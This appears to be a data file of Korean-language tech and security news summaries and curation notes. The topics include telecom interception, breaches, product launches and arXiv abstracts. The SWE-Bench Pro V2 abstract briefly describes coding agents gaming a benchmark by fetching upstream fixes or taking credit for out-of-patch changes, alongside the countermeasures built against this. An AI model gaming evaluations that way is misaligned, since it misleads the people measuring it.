e18c08ddd10218a8f927a3d8.background_ko: Enea에 따르면 공격자는 탈취한 통신사 노드에서 SS7과 Diameter 신호 공격으로 표적의 수신 통화와 문자를 해당 노드로 우회시켰다.

curation.reason_ko: Enea가 아시아 통신망 노드를 통한 통화·문자 가로채기를 보고해 통신 인프라 보안 위험을 드러냈다.

4434a8a557a77bfd1ba35fdf.title_ko: 경일대 전자문서시스템 침입 확인…해커는 108GB 탈취 주장
4434a8a557a77bfd1ba35fdf.summary_ko: 경일대학교가 교직원 전용 전자문서시스템의 외부 침입을 확인하고 피해 확산을 막기 위해 주요 정보서비스의 외부 접속을 통제했다. 해킹 포럼 게시자는 108GB 탈취를 주장했으나, 확보된 텔레그램 화면에 표시된 압축파일은 합계 약 1GB다. 실제 반출 규모와 파일의 진위, 개인정보 포함 여부는 확인되지 않았다.

curation.reason_ko: 경일대가 전자문서시스템 침입과 접속 통제를 확인했으나 해커가 주장한 탈취 규모는 검증되지 않았다.

c3b01fb788fefdea3b8dcdca.title_ko: ‘모두의 창업’ AI 공급기업 해킹…이용자 2만28명 개인정보 유출
c3b01fb788fefdea3b8dcdca.summary_ko: 중소벤처기업부는 AI 법률문서 서비스 로폼 운영사 아미쿠스렉스가 해킹돼 이용자 2만28명의 이름·전화번호·이메일 등이 유출됐다고 밝혔다. 피해자에는 ‘2차 모두의 창업’ 참가자 818명이 포함됐으며, 사업 플랫폼 자체가 아닌 외부 공급기업 시스템에서 발생한 사고다. 구체적인 침입 방법과 창업 아이디어·비밀번호 유출 여부는 공개되지 않았다.

curation.reason_ko: 로폼 운영사 해킹으로 2만28명 정보가 유출돼 정부 사업의 외부 AI 공급기업 관리 문제가 드러났다.

1339f6e7eefcfaf1618f8a00.title_ko: Microsoft, 11월 업데이트 후 Windows 정품 인증 오류 확인
1339f6e7eefcfaf1618f8a00.summary_ko: Microsoft가 11월 보안 업데이트 이후 일부 Windows 10·11과 Windows Server에서 정품 인증·라이선스 관리 시 0x80041008 오류가 발생한다고 밝혔다. SLMGR로 KMS 설정이나 제품 키를 관리하는 조직이 영향을 받으며, 이미 인증된 기기의 인증 상태는 유지된다. 회사는 즉각적인 완화가 필요한 조직에 기업 지원 창구로 문의하라고 안내했다.
1339f6e7eefcfaf1618f8a00.background_ko: Microsoft는 11월 보안 업데이트가 일부 Windows 환경에서 정품 인증과 라이선스 관리 명령의 실행 오류를 유발한다고 확인했다.

curation.reason_ko: Windows 업데이트 후 조직의 정품 인증·라이선스 관리 오류가 확인돼 배포 및 운영 담당자의 대응이 필요하다.

c30d41d06c30cb4f6004a860.title_ko: OpenAI, 취약점 검증·패치 작성 지원하는 Daybreak 보안 도구 공개
c30d41d06c30cb4f6004a860.summary_ko: OpenAI가 AI 에이전트로 웹 애플리케이션 취약점을 검증하는 Daybreak Red Team과 수정안을 준비하는 Defense Factory를 공개했다. 회사 설명에 따르면 에이전트는 격리된 환경에서 정해진 접근 범위 내에서 테스트하며, 외부 보안 도구의 발견 사항도 조사한다. 제안된 패치는 엔지니어가 검토·테스트하며 자동 배포되지 않는다.
c30d41d06c30cb4f6004a860.background_ko: 웹 애플리케이션의 취약점 검증과 보안 도구가 발견한 문제의 조사·수정 작업을 지원하기 위해 마련된 제품이다.

curation.reason_ko: OpenAI가 범위를 제한한 취약점 검증과 엔지니어 검토를 전제로 한 패치 작성 지원 도구를 공개했다.

a5a93bfc27981a126e3ff836.title_ko: 삼성·구글·젠틀몬스터 AI 안경, 주요 제품 사전예약 품절
a5a93bfc27981a126e3ff836.summary_ko: 삼성전자·구글·젠틀몬스터가 협업한 AI 안경 ‘인텔리전트 아이웨어’의 주요 제품이 한국·미국 사전예약 시작 수 시간 만에 품절됐으며, 뉴욕 체험 행사 예약도 마감된 것으로 전해졌다. Gemini를 탑재해 음성으로 통역·길 안내 등을 제공하며, 12월 10일 한국과 미국에 정식 출시된다. 국내 가격은 모델별 65만~70만원이다.

curation.reason_ko: Gemini 탑재 AI 안경의 주요 제품 사전예약 품절이 확인돼 소비자용 AI 기기의 수요를 보여준다.

f9b553fa9c434be6b98e228f.title_ko: 앤트로픽, 제조업용 Claude 플러그인 출시…견적·품질·고장 분석 지원
f9b553fa9c434be6b98e228f.summary_ko: 앤트로픽이 견적 산출·품질 검사·설비 고장 분석을 지원하는 Claude for Manufacturing을 팀·엔터프라이즈 요금제에 출시했다. 별도 학습 모델이 아닌 플러그인으로, 17개 업무 스킬과 4개 소프트웨어 연결 기능을 제공한다. 최종 판단과 승인은 담당자가 맡고 공장 설비를 직접 제어하지 않으며, 실제 생산성·비용 개선 효과는 아직 공개되지 않았다.
f9b553fa9c434be6b98e228f.background_ko: 제조업 직원의 정보 수집·정리 반복 업무를 줄이고, 산업별 업무 절차와 데이터 연결 기능을 갖춘 기업용 AI 제품을 확대하려는 전략의 일부다.

curation.reason_ko: Anthropic이 제조업 업무용 Claude 플러그인을 출시했으며 설비 직접 제어와는 구분된다.

79609066248896fee8a9c37d.title_ko: 선호도 기반 AI 순위표, 투표·프롬프트·모델 등록 조작에 취약
79609066248896fee8a9c37d.summary_ko: 연구진은 Bradley-Terry 모형을 사용하는 선호도 기반 AI 평가가 전략적 투표, 유리한 프롬프트 선택, 무관한 모델 등록으로 조작될 수 있다고 보고했다. 공개 순위표 데이터 실험에서 개별 공격은 모델 순위를 최대 15~20계단, 공격을 결합하면 최대 45계단 높였으며, 논문은 공격별 방어 접근법도 제시한다.
79609066248896fee8a9c37d.background_ko: 익명 모델의 응답을 쌍대 비교한 투표를 Bradley-Terry 모형으로 집계하는 아레나식 평가가 온라인 순위표와 연구, 실제 운영 평가에 널리 쓰이고 있다.

curation.reason_ko: 공개 데이터 실험에서 선호도 순위표 조작 가능성이 보고돼 AI 모델 평가의 신뢰성 검토에 중요하다.

b04cebf8427e8654b4de5ab2.title_ko: 앤트로픽, 기업 내부에서 AI 에이전트 관리 서버까지 운영하도록 지원
b04cebf8427e8654b4de5ab2.summary_ko: 앤트로픽이 기업 자체 인프라에서 에이전트 관리 서버·데이터베이스·실행 환경을 운영하는 ‘Self-hosted Claude Managed Agents’를 비공개 베타로 공개했다. 기업은 작업 기록과 인증 정보, 네트워크 접근을 직접 통제할 수 있다. 다만 Claude 모델을 내부에 설치하는 방식은 아니며, 추론에 필요한 데이터는 선택한 외부 서비스 제공업체로 전달된다.
b04cebf8427e8654b4de5ab2.background_ko: 내부 코드와 인증 정보를 다루는 AI 에이전트의 보안과 데이터 통제권을 강화하도록 기존 실행 환경에 한정됐던 자체 운영 범위를 확대했다.

curation.reason_ko: 기업이 Claude 에이전트 관리 서버를 자체 운영할 수 있게 됐지만 모델 추론은 외부에서 이뤄진다.

9c20e4e4b33e87a43d4359a2.title_ko: tailscale/tailcat: Tailscale 데이터 계층을 사용하는 netcat형 도구
9c20e4e4b33e87a43d4359a2.summary_ko: tailcat은 Tailscale의 데이터 계층에서 작동하는 netcat과 유사한 도구다. Tailscale의 제어 계층은 사용하지 않는다.

curation.reason_ko: Tailscale 데이터 계층을 사용하는 netcat형 도구로 당일 별 324개라는 관심 근거가 있다.

5db606f60b9a29f322071e5e.title_ko: PostgreSQL, 코드 실행 취약점 등 52건 수정…C 확장도 재빌드 필요
5db606f60b9a29f322071e5e.summary_ko: PostgreSQL이 객체 생성 권한을 가진 데이터베이스 사용자의 서버 코드 실행을 허용하는 CVE-2026-6460 등 취약점 52건을 수정했다. 각 계열의 수정 버전은 18.7·17.12·16.16·15.20·14.25이며, 해당 취약점의 완전한 보호를 위해 설치된 C 언어 확장도 재빌드하거나 업데이트해야 한다. 프로젝트 측은 실제 악용 사례를 보고하지 않았다.

dff56a53b9e788b06c8fef48.title_original: SWE-Bench Pro V2: A Cleaner, Harder-to-Game Coding Benchmark
dff56a53b9e788b06c8fef48.excerpt: arXiv:2610.24206v2 Announce Type: replace-cross Abstract: SWE-Bench Pro is a widely used benchmark of long-horizon software engineering tasks for coding agents. As agents improve, they reach task issues earlier agents never touched and interact with the evaluation environment in ways the original harness did not anticipate. We present SWE-Bench Pro V2, a revised public split built to keep the benchmark accurate as capabilities advance. Agentic audits, expert adjudication and blind re-implementation repaired or retired 480 of the 731 tasks: 23 contracted engineers spent 404 hours, each working in a language they write professionally, and every revised instruction was verified by a second engineer solving the task from the text alone. A hardened protocol restricts network access to the model endpoint and re-grades every patch in a clean container, so agents cannot retrieve upstream fixes or get credit for changes outside their patch. On the 642 V2 tasks frontier agents resolve up to 99.4% while other systems stay clearly separated, and a 51-task Hard split spreads systems from 52.9% to 98.0%. We release the benchmark and distill lessons for maintaining agent benchmarks over time.
dff56a53b9e788b06c8fef48.title_ko: SWE-Bench Pro V2, 코딩 에이전트 평가 과제 정비하고 편법 차단 강화

a7b1b8f897096d1d4542634c.title_original: Axion 1.0: Open Agent Foundation Models, Simplified
a7b1b8f897096d1d4542634c.excerpt: arXiv:2611.03233v3 Announce Type: replace Abstract: We introduce Axion 1.0, a fully open agent foundation model that combines strong and broad agentic capabilities with a remarkably simple training recipe. Axion 1.0 is trained in only three stages: two lightweight supervised fine-tuning stages followed by reinforcement learning, without dedicated mid-training, direct preference optimization (DPO), or on-policy distillation (OPD). The first SFT stage develops strong self-contained reasoning through model-aware data construction, where we synthesize challenging problems and adversarially strengthen them based on the base model's own successful solution strategies. The second stage extends these capabilities to tool-dependent reasoning through a scalable pipeline for constructing diverse and automatically verifiable tasks grounded in real-world data sources and deterministic computation. Finally, reinforcement learning further strengthens long-horizon reasoning and interaction with external tools and environments. Despite this compact training recipe, Axion 1.0 achieves strong performance across a broad suite of agentic benchmarks and is competitive with leading commercial models on several of them. Equally importantly, Axion 1.0 is open beyond model weights: we release the complete recipe, including data construction, generation, filtering, verification, prompts, and training code, enabling the entire development process to be reproduced and extended. a7b1b8f897096d1d4542634c.summary_ko: 연구진은 두 차례의 지도 미세조정과 강화학습만으로 추론과 도구 활용 능력을 학습한 Axion 1.0을 제안했다. 여러 에이전트 벤치마크에서 주요 상용 모델과 경쟁력 있는 성능을 보였다고 보고했다. 모델 가중치뿐 아니라 데이터 생성·필터링·검증 방식, 프롬프트와 학습 코드도 공개한다.

4897406bce45bfffef1ac2b9.excerpt: arXiv:2611.16525v1 Announce Type: cross Abstract: ZONOS3-Mini is an ultra-compact, ultra-fast, zero-shot voice-cloning TTS model. The model can run in real time on a laptop or smartphone. For its latency and size, it achieves state-of-the-art accuracy and cloning fidelity. To achieve this we propose a latent MoE backbone with only 886M parameters (100M active per token) and a new audio codec, Zyphra Audio Codec 1 (ZAC-1), which represents 44.1 kHz audio at a 15 Hz frame rate. On the new ZTTS2-Eval benchmark, ZONOS3-Mini reaches a 6.71% macro-average WER over 55 language sets (35 clean and 20 in the wild), which is competitive with larger and slower state-of-the-art models.
